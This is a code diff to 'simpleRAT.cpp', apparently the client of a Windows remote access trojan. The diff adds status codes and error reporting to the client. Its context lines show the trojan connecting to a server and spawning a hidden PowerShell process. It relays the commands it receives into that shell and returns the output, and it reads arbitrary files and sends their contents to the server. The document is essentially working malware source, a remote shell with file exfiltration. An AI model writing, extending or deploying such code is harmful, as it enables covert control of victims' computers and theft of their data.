@@ -1,7 +1,17 @@
 // simpleRAT.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 
+
 #include "Header.h"
+
+enum CmdStatus
+{
+    SUCCESSFUL = 0,
+    CLIENT_ERROR = 1,   //if there is an error with windows api functions, send the error code back to the client
+    SERVER_ERROR = 2,     //indicates server is turned off or an error in the communication
+    HANDSHAKE_ERROR = 3,
+
+};
 
 int keepRunning = 1;
 HANDLE newStdIn, writeStdIn;
@@ -47,7 +57,7 @@ bool performHandshake(SOCKET s)
 
 }
 
-bool spawnPowerShell(SOCKET s)
+int spawnPowerShell(SOCKET s)
 {
     SECURITY_ATTRIBUTES pipeAttr;
     pipeAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
@@ -71,14 +81,16 @@ bool spawnPowerShell(SOCKET s)
     startupInfo.wShowWindow = SW_HIDE;    //hide the windows
 
     bool processStatus = CreateProcessA(NULL, (LPSTR)"powershell.exe", 0, 0, true, 0, 0, 0, &startupInfo, &powershell);
+    int statusForSend = 0;
     if (!processStatus)
     {
-        puts("Can't start powershell");
-        return 0;
+        statusForSend = GetLastError();
+        send(s, (char*)&statusForSend, 4, 0);
+        return CLIENT_ERROR;
     }
     char output[512];
     int byteRead;
-
+    send(s, (char*)&statusForSend, 4, 0);   //let the server knows that powershell is spawned
     Sleep(2000);
     do
     {
@@ -97,7 +109,7 @@ bool spawnPowerShell(SOCKET s)
 
 }
 
-bool communicatePowerShell(SOCKET s)
+int communicatePowerShell(SOCKET s)
 {
     char command[512];
     int recvStat;
@@ -108,8 +120,8 @@ bool communicatePowerShell(SOCKET s)
         if (recvStat < 0)
         {
             puts("Server turned off");
-            return 0;
-            break;
+            TerminateProcess(powershell.hProcess, 0);
+            return SERVER_ERROR;
         }
 
         //quit if the command id is not correct
@@ -120,7 +132,6 @@ bool communicatePowerShell(SOCKET s)
             continue;
         }
         int byteWritten;
-        //command[4 + strlen(command + 4)] = '\n';
         if (WriteFile(writeStdIn, command + 4, strlen(command + 4), (LPDWORD)&byteWritten, 0) == 0)
         {
             send(s, "Failed to write to pipe", 26, 0);
@@ -130,6 +141,8 @@ bool communicatePowerShell(SOCKET s)
         Sleep(3000);
         int byteRead;
         char output[4096];
+
+        //pass data to powershell via pipe
         do
         {
             ZeroMemory(output, sizeof(output));
@@ -148,42 +161,50 @@ bool communicatePowerShell(SOCKET s)
             break;
         }
     }
-    return 1;
+    return SUCCESSFUL;
 }
 
-bool getFileContent(SOCKET s, char* filename)
+int getFileContent(SOCKET s, char* filename)
 {
     HANDLE fileHandle = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
+    int statusForSend = 0;
     if (fileHandle == INVALID_HANDLE_VALUE)
     {
         puts("Can't open file");
-        return 0;
+        statusForSend = GetLastError();
+        send(s, (char*)&statusForSend, 4, 0);
+        return CLIENT_ERROR;
     }
 
     HANDLE fileMap = CreateFileMappingA(fileHandle, NULL, PAGE_READONLY, 0, 0, NULL);
     if (fileMap == NULL)
     {
         CloseHandle(fileHandle);
+        statusForSend = GetLastError();
+        send(s, (char*)&statusForSend, 4, 0);
         puts("Can't create mapping");
-        return 0;
+        return CLIENT_ERROR;
     }
 
     BYTE* fileContent = (BYTE*)MapViewOfFile(fileMap, FILE_MAP_READ, 0, 0, 0);
     if (fileContent == NULL)
     {
         puts("Can't map view to address space");
-        return 0;
+        statusForSend = GetLastError();
+        send(s, (char*)&statusForSend, 4, 0);
+        return CLIENT_ERROR;
     }
 
     LARGE_INTEGER fileSizeStruct;
     GetFileSizeEx(fileHandle, &fileSizeStruct);
     LONGLONG fileSize = fileSizeStruct.QuadPart;
-    if (send(s, (const char*)fileContent, fileSize, 0) <= 0) return 0;
+    send(s, (char*)&statusForSend, 4, 0);   //let the server that all the reading are sucessful
+    if (send(s, (const char*)fileContent, fileSize, 0) <= 0) return SERVER_ERROR;
 
     UnmapViewOfFile(fileContent);
     CloseHandle(fileMap);
     CloseHandle(fileHandle);
-    return 1;
+    return SUCCESSFUL;
 
 }
 
@@ -218,19 +239,19 @@ int main()
     {
         printf("getaddrinfo failed: %d\n", iResult);
         WSACleanup();
-        return 1;
+        return SERVER_ERROR;
     }
 
     if (connect(s, server->ai_addr, server->ai_addrlen) == SOCKET_ERROR)
     {
         printf("Connection error: %d", WSAGetLastError());
-        exit(1);
+        exit(SERVER_ERROR);
     }
 
     if (!performHandshake(s))
     {
         printf("Handshake failed");
-        exit(1);
+        exit(HANDSHAKE_ERROR);
     }
 
     while (keepRunning)
@@ -240,7 +261,7 @@ int main()
 
         if (recv(s, command, 256, 0) <= 0) break;
         //printf("%d", *(int*)command);
-        bool status = 1;
+        int status = 0;
         switch (*(int*)command)
         {
         case 1:
@@ -261,7 +282,7 @@ int main()
             puts("Invalid command id");
             break;
         }
-        if (!status) puts("Failed to execute command");
+        if (status == SERVER_ERROR) break;
     }
     cleanUp();
     closesocket(s);
